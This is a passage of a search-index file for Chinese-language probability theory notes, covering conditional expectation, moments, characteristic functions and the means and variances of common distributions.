\\\\ &amp;= 2VarX - 2\\sqrt{\\frac{VarX}{VarY}} (\\sqrt{VarX} \\sqrt{VarY}) \\\\ &amp;= 0 \\end{aligned} \\] <p>\u56e0\u6b64</p> \\[ X - EX - t_0(Y - EY) = E(X - EX - t_0(Y - EY)) = 0 \\] <p>\u8bc1\u6bd5\u3002</p> <p>\u7c7b\u4f3c\uff0c\u5f53 \\(\\gamma = -1\\) \u65f6\uff0c\u5b58\u5728 \\(t_0 = -\\sqrt{\\dfrac{VarX}{VarY}}\\)\uff0c\u4f7f\u5f97</p> \\[ P(X = t_0(Y - EY) + EX) = 1 \\] <p>\u5373 \\(X\\) \u548c \\(Y\\) \u662f\u8d1f\u7ebf\u6027\u76f8\u5173\u7684\u3002</p> </li> <li> <p>\u6709</p> \\[ \\gamma = 0 \\Leftrightarrow \\text{\u4e0d\u76f8\u5173} \\] <p>\u201c\u4e0d\u76f8\u5173\u201d\u53ef\u4ee5\u89e3\u91ca\u4e3a\u201c\u4e0d\u7ebf\u6027\u76f8\u5173\u201d\u3002</p> </li> </ol>"},{"location":"math/prob_theory/chapter3/#_19","title":"\u6761\u4ef6\u671f\u671b\u4e0e\u5168\u671f\u671b\u516c\u5f0f","text":""},{"location":"math/prob_theory/chapter3/#_20","title":"\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u7684\u6761\u4ef6\u671f\u671b","text":"<p>\u7ed9\u5b9a \\(Y = y_j\\)\uff0c\\(X\\) \u7684\u6761\u4ef6\u671f\u671b\u4e3a</p> \\[ E(X|Y = y_j) = \\sum_{i=1}^\\infty x_i P(X = x_i | Y = y_j) \\] <p>\u8981\u6c42</p> \\[ \\sum_{i=1}^\\infty |x_i| P(X = x_i | Y = y_j) &lt; \\infty \\] <p>\u5426\u5219\u6761\u4ef6\u671f\u671b\u4e0d\u5b58\u5728\u3002</p>"},{"location":"math/prob_theory/chapter3/#_21","title":"\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u7684\u6761\u4ef6\u671f\u671b","text":"<p>\u7ed9\u5b9a \\(Y = y\\)\uff0c\\(X\\) \u7684\u6761\u4ef6\u671f\u671b\u4e3a</p> \\[ E(X|Y = y) = \\int_{-\\infty}^{\\infty} x P(X = x | Y = y) \\ \\mathrm{d}x \\] <p>\u8981\u6c42</p> \\[ \\int_{-\\infty}^{\\infty} |x| P(X = x | Y = y) \\ \\mathrm{d}x &lt; \\infty \\] <p>\u5426\u5219\u6761\u4ef6\u671f\u671b\u4e0d\u5b58\u5728\u3002</p> <p>\u4e8c\u5143\u8054\u5408\u6b63\u6001\u5206\u5e03\u7684\u6761\u4ef6\u671f\u671b</p> <p>\\((X, Y) \\sim N(\\mu_1, \\sigma_1^2, \\mu_2, \\sigma_2^2, \\rho)\\)\uff0c\u5219</p> <p>\u7ed9\u5b9a \\(Y = y\\)\uff0c\\(X\\) \u7684\u6761\u4ef6\u5206\u5e03\u4e3a</p> \\[ X \\sim N(\\mu_1 + \\rho \\frac{\\sigma_1}{\\sigma_2}(y - \\mu_2), \\sigma_1^2(1 - \\rho^2)) \\] <p>\u56e0\u6b64</p> \\[ E(X|Y = y) = \\mu_1 + \\rho \\frac{\\sigma_1}{\\sigma_2}(y - \\mu_2) \\] <p>\u4ee4 \\(g(y) = E(X|Y = y)\\)\uff0c\u5219</p> \\[ \\begin{aligned} Eg(Y) &amp;= E(\\mu_1 + \\rho \\frac{\\sigma_1}{\\sigma_2}(Y - \\mu_2)) \\\\ &amp;= \\mu_1 + \\rho \\frac{\\sigma_1}{\\sigma_2}(EY - \\mu_2) \\\\ &amp;= EX \\end{aligned} \\] <p>\u5373 \\(E_Y(E_X(X|Y)) = EX\\)\u3002</p>"},{"location":"math/prob_theory/chapter3/#_22","title":"\u5168\u671f\u671b\u516c\u5f0f","text":"<p>\u8bbe \\(X,Y\\) \u662f\u968f\u673a\u53d8\u91cf\uff0c\u4ee4</p> \\[ g(y) = E(X|Y = y) \\] <p>\u5373 \\(g(Y) = E(X|Y)\\)\uff0c\u5219</p> \\[ \\begin{aligned} Eg(Y) &amp;= \\sum_{j=1}^\\infty g(y_j) P(Y = y_j) \\\\ &amp;= \\sum_{j=1}^\\infty \\sum_{i=1}^\\infty x_i P(X = x_i | Y = y_j) P(Y = y_j) \\\\ &amp;= \\sum_{i=1}^\\infty x_i \\sum_{j=1}^\\infty P(X = x_i | Y = y_j) P(Y = y_j) \\\\ &amp;= \\sum_{i=1}^\\infty x_i P(X = x_i), \\qquad \\text{\u5168\u6982\u7387\u516c\u5f0f} \\\\ &amp;= EX \\end{aligned} \\] <p>\u7ed3\u8bba \\(E(E(X|Y)) = EX\\) \u79f0\u4e3a\u5168\u671f\u671b\u516c\u5f0f\u3002</p>"},{"location":"math/prob_theory/chapter3/#_23","title":"\u77e9","text":"<p>k \u9636\u77e9\uff08\u539f\u70b9\u77e9\uff09\uff1a\\(E(X^k)\\)</p> <p>k \u9636\u4e2d\u5fc3\u77e9\uff1a\\(E[(X - EX)^k]\\)</p> <p>\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\u662f\u5426\u7531\u5176\u77e9\u552f\u4e00\u786e\u5b9a</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u80fd\u3002</p> <p>\u5b9a\u7406</p> <p>\u8bbe \\(X\\) \u548c \\(Y\\) \u662f\u4e24\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5982\u679c\u5bf9\u4e8e \\(\\forall k \\geq 1\\)\uff0c\u6709</p> \\[ E(X^k) = E(Y^k) = m_k &lt; \\infty \\] <p>\u82e5\u4e0b\u5217\u4e09\u4e2a\u6761\u4ef6\u4e4b\u4e00\u6210\u7acb\uff1a</p> <ol> <li>\\(\\displaystyle\\sum_{k=1}^\\infty \\dfrac{m_{2k}t^{2k}}{(2k)!} &lt; \\infty, \\exists t &gt; 0\\)</li> <li>\\(\\displaystyle\\sum_{k=1}^\\infty m_{2k}^{-\\frac{1}{2k}} &lt; \\infty\\)</li> <li>\\(\\displaystyle\\lim_{k \\rightarrow \\infty} \\sup |m_k|^{\\frac{1}{k}} &lt; \\infty\\)</li> </ol> <p>\u5219 \\(X\\) \u548c \\(Y\\) \u7684\u5206\u5e03\u51fd\u6570\u76f8\u540c\u3002</p>"},{"location":"math/prob_theory/chapter3/#_24","title":"\u7279\u5f81\u51fd\u6570","text":"<p>\u8bbe \\(X \\sim F(x)\\)\uff0c\u5b9a\u4e49</p> \\[ \\varphi(t) = E(e^{itX}), t \\in \\mathbb{R} \\] <p>\u4e3a \\(X\\) \u7684\u7279\u5f81\u51fd\u6570\u3002\u5176\u4e2d \\(Ee^{itX} = E\\cos tX + iE\\sin tX\\) \u5b58\u5728\u4e14\u6709\u9650\u3002</p> <p>\u8ba1\u7b97\u516c\u5f0f\uff1a</p> \\[ \\begin{aligned} \\varphi(t) &amp;= E(e^{itX}) \\\\ &amp;= \\int_{-\\infty}^{\\infty} e^{itx} p(x) \\ \\mathrm{d}x \\\\ &amp;= \\int_{-\\infty}^{\\infty} e^{itx} \\ \\mathrm{d}F(x) \\end{aligned} \\]"},{"location":"math/prob_theory/chapter3/#_25","title":"\u7279\u5f81\u51fd\u6570\u7684\u6027\u8d28","text":"<ol> <li>\\(\\varphi(0) = 1\\)</li> <li> <p>\\(|\\varphi(t)| \\leq 1 = \\varphi(0)\\)</p> <p>\u8bc1\u660e</p> \\[ \\begin{aligned} |\\varphi(t)| &amp;= |E(e^{itX})| \\\\ &amp;= |\\int_{-\\infty}^{\\infty} e^{itx} \\ \\mathrm{d}F(x)| \\\\ &amp;\\leq \\int_{-\\infty}^{\\infty} |e^{itx}| \\ \\mathrm{d}F(x) \\\\ &amp;= 1 \\end{aligned} \\] </li> <li> <p>\\(\\varphi(-t) = \\overline{\\varphi(t)}\\)</p> </li> <li> <p>\\(\\varphi(t)\\) \u5728 \\(\\mathbb{R}\\) \u4e0a\u4e00\u81f4\u8fde\u7eed</p> <p>\u8bc1\u660e</p> <p>\u5373\u8bc1\uff0c\u5bf9\u4e8e \\(\\forall \\varepsilon &gt; 0\\)\uff0c\\(\\exists \\delta &gt; 0, \\forall h &lt; \\delta, \\forall t \\in \\mathbb{R}\\)\uff0c\u6709</p> \\[ |\\varphi(t + h) - \\varphi(t)| &lt; \\varepsilon \\] <p>\u7531 \\(\\varphi(t)\\) \u7684\u5b9a\u4e49\u53ef\u77e5</p> \\[ \\begin{aligned} |\\varphi(t + h) - \\varphi(t)| &amp;= |E(e^{i(t+h)X}) - E(e^{itX})| \\\\ &amp;= |E(e^{itX}(e^{ihX} - 1))| \\\\ &amp;\\leq E|e^{ihX} - 1| \\end{aligned} \\] <p>\u56fa\u5b9a \\(\\varepsilon &gt; 0\\)\uff0c\u8bbe \\(X \\sim F(x)\\)\uff0c\u5219 \\(\\exists M &gt; 0\\)\uff0c\u4f7f\u5f97</p> \\[ P(|X| &gt; M) = 1 - F(M) + F(-M) \\leq \\frac{\\varepsilon}{4} \\] <p>\u5219</p> \\[ \\begin{aligned} |\\varphi(t + h) - \\varphi(t)| &amp;\\leq E|e^{ihX} - 1| \\\\ &amp;= \\int_{-\\infty}^{\\infty} |e^{ihx} - 1| \\ \\mathrm{d}F(x) \\\\ &amp;= \\int_{|x| &gt; M} |e^{ihx} - 1| p(x) \\ \\mathrm{d}x + \\int_{|x| \\leq M} |e^{ihx} - 1| p(x) \\ \\mathrm{d}x \\\\ &amp;&lt; I_1 + I_2 \\end{aligned} \\] <p>\u5176\u4e2d \\(I_1 &lt; 2 \\cdot \\dfrac{\\varepsilon}{4} = \\dfrac{\\varepsilon}{2}\\)\uff0c\u5bf9\u4e8e \\(I_2\\)\uff1a</p> \\[ \\begin{aligned} |e^{ihx} - 1| &amp;= |e^{i\\frac{h}{2}x}||e^{i\\frac{h}{2}x} - e^{-i\\frac{h}{2}x}| \\\\ &amp;= 2|\\sin \\frac{hx}{2}| \\\\ &amp;\\leq 2|\\frac{hx}{2}| \\\\ &amp;= |hx| \\\\ &amp;\\leq hM \\end{aligned} \\] <p>\u56e0\u6b64</p> \\[ |\\varphi(t + h) - \\varphi(t)| &lt; I_1 + I_2 &lt; \\frac{\\varepsilon}{2} + hM \\] <p>\u53d6 \\(\\delta = \\dfrac{\\varepsilon}{2M}\\)\uff0c\u5219\u5f53 \\(h &lt; \\delta\\) \u65f6\uff0c\u6709</p> \\[ |\\varphi(t + h) - \\varphi(t)| &lt; \\frac{\\varepsilon}{2} + hM &lt; \\frac{\\varepsilon}{2} + \\frac{\\varepsilon}{2} = \\varepsilon \\] <p>\u8bc1\u6bd5\u3002</p> </li> <li> <p>Bochner \u975e\u8d1f\u5b9a\u6027</p> <p>\u5bf9\u4efb\u4f55\u5b9e\u6570 \\(t_1, t_2, \\cdots, t_n\\)\uff0c\u590d\u6570 \\(a_1, a_2, \\cdots, a_n\\)\uff0c\u6709</p> \\[ \\sum_{i=1}^n \\sum_{j=1}^n a_i \\overline{a_j} \\varphi(t_i - t_j) \\geq 0 \\] <p>\u8bc1\u660e</p> <p>\u4ee4 \\(X \\sim F(x)\\)\uff0c\u5219</p> \\[ \\begin{aligned} \\sum_{i=1}^n \\sum_{j=1}^n a_i \\overline{a_j} \\varphi(t_i - t_j) &amp;= \\sum_{i=1}^n \\sum_{j=1}^n a_i \\overline{a_j} E(e^{i(t_i - t_j)X}) \\\\ &amp;= E\\sum_{i=1}^n \\sum_{j=1}^n a_i \\overline{a_j} e^{it_iX} \\overline{e^{it_jX}} \\\\ &amp;= E|\\sum_{i=1}^n a_i e^{it_iX}|^2 \\\\ &amp;\\geq 0 \\end{aligned} \\] </li> <li> <p>\u53ef\u5fae\u6027</p> <p>\u8bbe \\(EX\\) \u5b58\u5728\u4e14 \\(EX = \\mu\\)\uff0c\u5219 \\(\\varphi(t)\\) \u53ef\u5fae</p> <p>\u5219 \\(\\varphi'(0) = i\\mu\\)</p> \\[ \\begin{aligned} \\varphi'(t) &amp;= \\frac{\\mathrm{d}}{\\mathrm{d}t} E(e^{itX}) \\\\ &amp;= \\int_{-\\infty}^{\\infty} \\frac{\\mathrm{d}}{\\mathrm{d}t} e^{itx} p(x) \\ \\mathrm{d}x \\\\ &amp;= i \\int_{-\\infty}^{\\infty} xe^{itx} \\ \\mathrm{d}F(x) \\end{aligned} \\] <p>\u7c7b\u4f3c\uff0c\u5982\u679c \\(E|X|^k &lt; \\infty\\)\uff0c\u5219</p> \\[ \\varphi^{(k)}(t) = i^k \\int_{-\\infty}^{\\infty} x^k e^{itx} \\ \\mathrm{d}F(x) \\] <p>\\(\\varphi(t)\\) \u5728 0 \u5904\u53ef\u4ee5\u8fdb\u884c k \u6b21\u5c55\u5f00\uff1a</p> \\[ \\begin{aligned} \\varphi(t) &amp;= \\varphi(0) + \\varphi'(0)t + \\frac{\\varphi''(0)}{2!}t^2 + \\cdots + \\frac{\\varphi^{(k)}(0)}{k!}t^k + o(t^k) \\\\ &amp;= 1 + iE(X)t - \\frac{1}{2}E(X^2)t^2 + \\cdots + i^k \\frac{E(X^k)}{k!}t^k + o(t^k) \\end{aligned} \\] </li> </ol>"},{"location":"math/prob_theory/chapter3/#_26","title":"\u7279\u5f81\u51fd\u6570\u7684\u8fd0\u7b97\u6027\u8d28","text":"<ol> <li> <p>\u4ee4 \\(X\\) \u7684\u7279\u5f81\u51fd\u6570\u4e3a \\(\\varphi_X(t)\\)\uff0c\u5219</p> \\[ \\varphi_{aX+c}(t) = E(e^{it(aX+c)}) = e^{itc}E(e^{i(at)X}) = e^{itc}\\varphi_X(at) \\] <p>Example</p> <p>\u8bbe \\(X \\sim N(0, 1), Y \\sim N(\\mu, \\sigma^2)\\)\uff0c\u5219</p> \\[ Y = \\sigma X + \\mu \\] <p>\u56e0\u6b64</p> \\[ \\varphi_Y(t) = e^{it\\mu} \\varphi_X(\\sigma t) = e^{it\\mu - \\frac{1}{2} \\sigma^2 t^2} \\] </li> <li> <p>\u4e58\u6cd5\u516c\u5f0f</p> <p>\u82e5 \\(X, Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5219 \\(Z = X + Y\\) \u7684\u7279\u5f81\u51fd\u6570\u4e3a</p> \\[ \\varphi_Z(t) = \\varphi_X(t) \\varphi_Y(t) \\] <p>\u63a8\u5e7f</p> <p>\u82e5 \\(X_1, X_2, \\cdots, X_n\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5219 \\(Z = \\sum_{i=1}^n X_i\\) \u7684\u7279\u5f81\u51fd\u6570\u4e3a</p> \\[ \\varphi_Z(t) = \\prod_{i=1}^n \\varphi_{X_i}(t) \\] </li> <li> <p>\u552f\u4e00\u6027\u95ee\u9898\uff1a\u5982\u679c \\(\\varphi_X(t) = \\varphi_Y(t)\\)\uff0c\u5219</p> \\[ X \\overset{d}{=} Y, \\qquad F_X \\equiv F_Y \\] <p>\u63a8\u8bba</p> <ol> <li> <p>\u8fde\u7eed\u6027\u60c5\u51b5</p> <p>\u82e5 \\(X\\) \u7684\u7279\u5f81\u51fd\u6570 \\(\\varphi(t)\\) \u7edd\u5bf9\u53ef\u79ef\uff0c\u5219 \\(X\\) \u5177\u6709\u5bc6\u5ea6\u51fd\u6570 \\(p(x)\\)\uff0c\u4e14</p> \\[ p(x) = \\frac{1}{2\\pi} \\int_{-\\infty}^{\\infty} e^{-itx} \\varphi(t) \\ \\mathrm{d}t \\] <p>\u5bf9\u5076\u516c\u5f0f</p> <p>\u5df2\u77e5 \\(X \\sim p(x)\\)\uff0c\u5219</p> \\[ \\varphi(t) = \\int_{-\\infty}^{\\infty} e^{itx} p(x) \\ \\mathrm{d}x \\] Example <p>\\(\\varphi(t) = e^{-|t|}\\) \u662f\u4e00\u4e2a\u7279\u5f81\u51fd\u6570\uff0c\u6c42\u5176\u5bf9\u5e94\u7684\u5bc6\u5ea6\u51fd\u6570\u3002</p> <p>\u89e3</p> <p>\\(\\varphi(t)\\) \u7edd\u5bf9\u53ef\u79ef\uff0c\u56e0\u6b64\u5b58\u5728\u5bc6\u5ea6\u51fd\u6570 \\(p(x)\\)\uff0c\u4e14</p> \\[ \\begin{aligned} p(x) &amp;= \\frac{1}{2\\pi} \\int_{-\\infty}^{\\infty} e^{-itx} e^{-|t|} \\ \\mathrm{d}t \\\\ &amp;= \\frac{1}{2\\pi} \\left[ \\int_{0}^{\\infty} e^{-itx} e^{-t} \\ \\mathrm{d}t + \\int_{-\\infty}^{0} e^{-itx} e^{t} \\ \\mathrm{d}t \\right] \\\\ &amp;= \\frac{1}{\\pi} \\cdot \\frac{1}{1 + x^2} \\end{aligned} \\] <p>\u6545 \\(X \\sim p(x) = \\dfrac{1}{\\pi} \\cdot \\dfrac{1}{1 + x^2}\\)\u3002</p> </li> <li> <p>\u79bb\u6563\u6027\u60c5\u51b5</p> <p>\u8bbe \\(\\varphi(t)\\) \u662f\u4e00\u4e2a\u7279\u5f81\u51fd\u6570\uff0c\u82e5</p> \\[ \\varphi(t) = \\sum_{k=-\\infty}^{\\infty} a_k e^{itk} \\] <p>\u4e14</p> \\[ a_k \\geq 0, \\qquad \\sum_{k=-\\infty}^{\\infty} a_k = 1 \\] <p>\u5219</p> \\[ P(X = k) = a_k \\] Example <p>\u8bbe \\(\\varphi(t) = \\cos t\\)\uff0c\u5219\u6709</p> \\[ \\varphi(t) = \\frac{1}{2} e^{it} + \\frac{1}{2} e^{-it} \\] <p>\u56e0\u6b64</p> \\[ P(X = 1) = \\frac{1}{2}, \\qquad P(X = -1) = \\frac{1}{2} \\] </li> </ol> <p>\u5229\u7528\u552f\u4e00\u6027\uff0c\u53ef\u4ee5\u5229\u7528\u5df2\u77e5\u7684\u5206\u5e03\u5224\u65ad\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\u3002</p> <p>Example</p> <p>\u8bbe \\(X_k \\sim N(\\mu_k, \\sigma_k^2), k = 1, 2, \\cdots, n\\)\uff0c\u6c42</p> \\[ Z = \\sum_{k=1}^n X_k \\] <p>\u7684\u5206\u5e03\u3002</p> \u89e3 <ol> <li> <p>\u5148\u6c42 \\(Z\\) \u7684\u7279\u5f81\u51fd\u6570</p> \\[ \\begin{aligned} \\varphi_Z(t) &amp;= \\prod_{k=1}^n \\varphi_{X_k}(t) \\\\ &amp;= \\prod_{k=1}^n e^{it\\mu_k - \\frac{1}{2} \\sigma_k^2 t^2} \\\\ &amp;= e^{it\\sum_{k=1}^n \\mu_k - \\frac{1}{2} t^2 \\sum_{k=1}^n \\sigma_k^2} \\end{aligned} \\] </li> <li> <p>\u5c06\u5176\u4e0e\u6b63\u6001\u5206\u5e03\u7684\u7279\u5f81\u51fd\u6570\u6bd4\u8f83\uff0c\u53ef\u5f97</p> \\[ Z \\sim N(\\sum_{k=1}^n \\mu_k, \\sum_{k=1}^n \\sigma_k^2) \\] </li> </ol> </li> </ol>"},{"location":"math/prob_theory/chapter3/#_27","title":"\u4e8c\u5143\u968f\u673a\u5411\u91cf\u7684\u7279\u5f81\u51fd\u6570","text":"<p>\u8bbe \\((X, Y)\\) \u662f\u4e8c\u7ef4\u968f\u673a\u5411\u91cf\uff0c\u5176\u7279\u5f81\u51fd\u6570\u4e3a</p> \\[ \\varphi(t_1, t_2) = E(e^{i(t_1X + t_2Y)}) \\] <p>\u5f53 \\(X, Y\\) \u76f8\u4e92\u72ec\u7acb\u65f6\uff0c\u6709</p> \\[ \\varphi(t_1, t_2) = \\varphi_X(t_1) \\varphi_Y(t_2) \\] <p>Example</p> <p>\u8bbe \\((X, Y) \\sim N(\\mu_1, \\sigma_1^2, \\mu_2, \\sigma_2^2, \\rho)\\)\uff0c\u6c42 \\(\\varphi(t_1, t_2)\\)\u3002</p> <p>\u89e3</p> <p>\u5047\u8bbe \\((X, Y) \\sim N(0, 1, 0, 1, \\rho)\\)\uff0c\u4ee4</p> \\[ \\Sigma =  \\begin{pmatrix}     1 &amp; \\rho \\\\     \\rho &amp; 1 \\end{pmatrix} \\] <p>\u8bbe</p> \\[ \\begin{pmatrix}     U \\\\     V \\end{pmatrix} = \\Sigma^{-\\frac{1}{2}} \\begin{pmatrix}     X \\\\     Y \\end{pmatrix} \\] <p>\u6839\u636e 3.2.2 \u8282\u4e2d\u7684\u7ed3\u8bba\uff0c\u6709</p> \\[ \\begin{aligned} E(U, V)' &amp;= \\Sigma^{-\\frac{1}{2}} E(X, Y)' = 0 \\\\ \\Sigma_{UV} &amp;= \\Sigma^{-\\frac{1}{2}} \\Sigma (\\Sigma^{-\\frac{1}{2}})' = \\Sigma^{-\\frac{1}{2}} \\Sigma \\Sigma^{-\\frac{1}{2}} = I \\end{aligned} \\] <p>\u56e0\u6b64 \\(Cov(U, V) = 0 \\Rightarrow \\gamma_{UV} = 0\\)\uff0c\u5373 \\((U, V) \\sim N(0, 1, 0, 1, 0)\\)\uff0c\u5373 \\(U, V\\) \u76f8\u4e92\u72ec\u7acb\u3002\u5219</p> \\[ \\begin{aligned} \\varphi_{UV}(t_1, t_2) &amp;= \\varphi_U(t_1) \\varphi_V(t_2) \\\\ &amp;= e^{-\\frac{1}{2}(t_1^2 + t_2^2)} \\\\ &amp;= e^{-\\frac{1}{2}(t_1, t_2) (t_1, t_2)'} \\end{aligned} \\] <p>\u56e0\u6b64</p> \\[ \\begin{aligned} \\varphi(t_1, t_2) &amp;= E(e^{i(t_1X + t_2Y)}) \\\\ &amp;= E(e^{i(t_1, t_2)(X, Y)'}) \\\\ &amp;= E(e^{i(t_1, t_2)\\Sigma^{\\frac{1}{2}}(U, V)'}) \\\\ &amp;= \\varphi_{UV}((t_1, t_2)\\Sigma^{\\frac{1}{2}}) \\\\ &amp;= e^{-\\frac{1}{2}(t_1, t_2)\\Sigma^{\\frac{1}{2}} \\Sigma^{\\frac{1}{2}} (t_1, t_2)'} \\\\ &amp;= e^{-\\frac{1}{2}(t_1, t_2)\\Sigma (t_1, t_2)'} \\end{aligned} \\] <p>\u56de\u5230\u539f\u95ee\u9898\uff0c\u5df2\u7ecf\u5f97\u5230\u5f53 \\((\\xi, \\eta) \\sim N(0, 1, 0, 1, \\rho)\\) \u65f6\u7684\u7279\u5f81\u51fd\u6570\u4e3a</p> \\[ \\varphi_{\\xi \\eta}(t_1, t_2) = e^{-\\frac{1}{2}(t_1, t_2) \\begin{pmatrix}     1 &amp; \\rho \\\\     \\rho &amp; 1 \\end{pmatrix} (t_1, t_2)'} \\] <p>\u539f \\((X, Y) \\sim N(\\mu_1, \\sigma_1^2, \\mu_2, \\sigma_2^2, \\rho)\\)\uff0c\u6709</p> \\[ \\begin{pmatrix}     X \\\\     Y \\end{pmatrix} = \\begin{pmatrix}     \\sigma_1 \\xi + \\mu_1 \\\\     \\sigma_2 \\eta + \\mu_2 \\end{pmatrix} \\] <p>\u56e0\u6b64</p> \\[ \\begin{aligned} \\varphi(t_1, t_2) &amp;= E(e^{i(t_1X + t_2Y)}) \\\\ &amp;= E(e^{i(t_1(\\sigma_1 \\xi + \\mu_1) + t_2(\\sigma_2 \\eta + \\mu_2))}) \\\\ &amp;= e^{i(t_1 \\mu_1 + t_2 \\mu_2)} E(e^{i(t_1 \\sigma_1 \\xi + t_2 \\sigma_2 \\eta)}) \\\\ &amp;= e^{i(t_1 \\mu_1 + t_2 \\mu_2)} \\varphi_{\\xi \\eta}(t_1 \\sigma_1, t_2 \\sigma_2) \\\\ &amp;= e^{i(t_1 \\mu_1 + t_2 \\mu_2) - \\frac{1}{2}(t_1 \\sigma_1, t_2 \\sigma_2) \\Sigma (t_1 \\sigma_1, t_2 \\sigma_2)'} \\\\ \\end{aligned} \\]"},{"location":"math/prob_theory/chapter3/#_28","title":"\u5e38\u89c1\u968f\u673a\u53d8\u91cf\u7684\u671f\u671b\u3001\u65b9\u5dee","text":""},{"location":"math/prob_theory/chapter3/#_29","title":"\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf","text":"<p>\u9000\u5316\u5206\u5e03</p> \\[ X \\sim \\begin{pmatrix}     c \\\\     1 \\end{pmatrix} , P(X = c) = 1 \\] <ul> <li> <p>\u671f\u671b</p> \\[ E(X) = c \\] </li> <li> <p>\u65b9\u5dee</p> \\[ VarX = E(X^2) - (EX)^2 = c^2 - c^2 = 0 \\] </li> <li> <p>\u7279\u5f81\u51fd\u6570</p> \\[ \\varphi(t) = E(e^{itX}) = e^{itc} \\] </li> </ul> <p>\u4e8c\u9879 Bernoulli \u5206\u5e03</p> \\[ X \\sim B(n, p), P(X = k) = \\binom{n}{k} p^k (1-p)^{n-k} \\] <ul> <li> <p>\u671f\u671b</p> \\[ E(X) = \\sum_{k=0}^n k \\binom{n}{k} p^k (1-p)^{n-k} = np \\] </li> <li> <p>\u65b9\u5dee</p> \\[ \\begin{aligned} VarX &amp;= E(X^2) - (EX)^2 \\\\ &amp;= n(n-1)p^2 + np - n^2p^2 \\\\ &amp;= np(1-p) \\end{aligned} \\] \u8fc7\u7a0b \\[ \\begin{aligned} E(X^2) &amp;= \\sum_{k=0}^n k^2 \\binom{n}{k} p^k (1-p)^{n-k} \\\\ &amp;= \\sum_{k=1}^n k(k-1) \\binom{n}{k} p^k (1-p)^{n-k} + \\sum_{k=1}^n k \\binom{n}{k} p^k (1-p)^{n-k} \\\\ &amp;= \\sum_{k=2}^n \\frac{n!}{(k - 2)! (n - k)!} p^k (1-p)^{n-k} + np \\\\ &amp;= n(n-1)p^2\\sum_{k=2}^n \\binom{n-2}{k-2} p^{k-2} (1-p)^{(n-2)-(k-2)} + np \\\\ &amp;= n(n-1)p^2 + np \\\\ \\end{aligned} \\] <p>\u4f7f\u7528\u65b9\u5dee\u7684\u6027\u8d28</p> <p>\u4ee4 \\(X_i\\) \u8868\u793a\u7b2c \\(i\\) \u6b21\u8bd5\u9a8c\u4e2d\u6210\u529f\u7684\u6b21\u6570\u3002</p> \\[ X_i = \\begin{cases}     1, &amp; p \\\\     0, &amp; 1 - p \\end{cases} \\] <p>\u5219</p> \\[ VarX = \\sum_{i=1}^n VarX_i = np(1-p) \\] </li> <li> <p>\u7279\u5f81\u51fd\u6570</p> \\[ \\begin{aligned} \\varphi(t) &amp;= E(e^{itX}) \\\\ &amp;= \\sum_{k=0}^n e^{itk} \\binom{n}{k} p^k (1-p)^{n-k} \\\\ &amp;= \\sum_{k=0}^n \\binom{n}{k} (pe^{it})^k (1-p)^{n-k} \\\\ &amp;= (pe^{it} + 1 - p)^n \\end{aligned} \\] <p>\u4f7f\u7528\u6bcf\u6b21\u8bd5\u9a8c\u7684\u72ec\u7acb\u6027</p> \\[ \\begin{aligned} \\varphi(t) &amp;= E(e^{itX}) \\\\ &amp;= E(e^{it(X_1 + X_2 + \\cdots + X_n)}) \\\\ &amp;= E(\\prod_{i=1}^n e^{itX_i}) \\\\ &amp;= \\prod_{i=1}^n E(e^{itX_i}) \\\\ &amp;= \\prod_{i=1}^n (pe^{it} + 1 - p) \\\\ &amp;= (pe^{it} + 1 - p)^n \\end{aligned} \\] </li> </ul> <p>Poisson \u5206\u5e03</p> \\[ X \\sim P(\\lambda), P(X = k) = \\frac{\\lambda^k}{k!} e^{-\\lambda} \\] <ul> <li> <p>\u671f\u671b</p> \\[ \\begin{aligned} E(X) &amp;= \\sum_{k=0}^\\infty k \\frac{\\lambda^k}{k!} e^{-\\lambda} \\\\ &amp;= \\lambda e^{-\\lambda} \\sum_{k=0}^\\infty \\frac{\\lambda^k}{k!} \\\\ &amp;= \\lambda e^{-\\lambda} e^\\lambda \\\\ &amp;= \\lambda \\end{aligned} \\] </li> <li> <p>\u65b9\u5dee</p> \\[ \\begin{aligned} VarX &amp;= E(X^2) - (EX)^2 \\\\ &amp;= \\lambda^2 + \\lambda - \\lambda^2 \\\\ &amp;= \\lambda \\end{aligned} \\] \u8fc7\u7a0b \\[ \\begin{aligned} E(X^2) &amp;= \\sum_{k=0}^\\infty k^2 \\frac{\\lambda^k}{k!} e^{-\\lambda} \\\\ &amp;= \\sum_{k=1}^\\infty k(k-1) \\frac{\\lambda^k}{k!} e^{-\\lambda} + \\sum_{k=1}^\\infty k \\frac{\\lambda^k}{k!} e^{-\\lambda} \\\\ &amp;= \\sum_{k=2}^\\infty \\frac{\\lambda^k}{(k-2)!} e^{-\\lambda} + \\lambda \\\\ &amp;= \\lambda^2 + \\lambda \\end{aligned} \\] </li> <li> <p>\u77e9</p> \\[ EX(X-1)\\cdots(X-k+1) = \\lambda^k, k \\geq 1 \\] <p>\u8bc1\u660e</p> \\[ \\begin{aligned} EX(X-1)\\cdots(X-k+1) &amp;= \\sum_{x=0}^\\infty x(x-1)\\cdots(x-k+1) \\frac{\\lambda^x}{x!} e^{-\\lambda} \\\\ &amp;= \\sum_{x=k}^\\infty \\frac{x!}{(x-k)!} \\frac{\\lambda^x}{x!} e^{-\\lambda} \\\\ &amp;= \\sum_{x=k}^\\infty \\frac{\\lambda^x}{(x-k)!} e^{-\\lambda} \\\\ &amp;= \\lambda^k \\sum_{x=k}^\\infty \\frac{\\lambda^{x-k}}{(x-k)!} e^{-\\lambda} \\\\ &amp;= \\lambda^k \\end{aligned} \\] <p>\u5219</p> \\[ \\begin{aligned} E(X^2) &amp;= EX(X-1) + EX = \\lambda^2 + \\lambda \\\\ E(X^3) &amp;= EX(X-1)(X-2) + 3EX(X-1) + EX = \\lambda^3 + 3\\lambda^2 + \\lambda \\\\ E(X^4) &amp;= EX(X-1)(X-2)(X-3) + 6EX(X-1)(X-2) + 7EX(X-1) + EX = \\lambda^4 + 6\\lambda^3 + 7\\lambda^2 + \\lambda \\\\ \\cdots \\end{aligned} \\] </li> <li> <p>\u7279\u5f81\u51fd\u6570</p> \\[ \\begin{aligned} \\varphi(t) &amp;= E(e^{itX}) \\\\ &amp;= \\sum_{k=0}^\\infty e^{itk} 